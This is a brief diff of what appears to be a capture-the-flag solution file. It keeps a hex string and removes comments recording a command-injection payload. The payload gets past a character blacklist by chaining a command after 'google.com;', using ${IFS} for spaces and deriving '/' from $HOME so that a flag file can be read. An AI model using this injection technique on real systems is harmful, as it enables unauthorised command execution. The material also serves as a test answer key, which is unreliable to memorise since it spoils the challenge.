@@ -1,5 +1,1 @@
 4d4398eeda72014f7d090a6893ecd8da
-
-# Blacklist blocked: spaces, /, |, %, &, <, >, and common commands
-# Final payload:
-# google.com;head${IFS}$(expr${IFS}substr${IFS}$HOME${IFS}1${IFS}1)var$(expr${IFS}substr${IFS}$HOME${IFS}1${IFS}1)2-flag.txt
